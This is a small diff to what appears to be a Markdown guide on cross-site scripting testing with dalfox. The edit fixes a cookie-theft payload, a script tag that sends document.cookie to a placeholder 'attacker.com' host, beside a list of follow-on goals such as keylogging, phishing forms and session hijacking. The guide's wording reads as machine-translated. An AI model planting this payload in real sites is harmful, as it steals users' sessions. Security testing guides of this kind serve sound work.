@@ -113,7 +113,7 @@ dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
 4. Assess the impact (Cookie theft, session hijacking, etc.)
 
 ### Take advantage of the scene.
-- Cookie theft: `<script>document.location='http://attacker.com/steal? cookie='+document.cookie</script>`
+- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
 - Keyboard Record: Inject Keyboard Incident Monitor
 - Fishing attacks: forgery of login forms
 - Session hijacking: get user session token
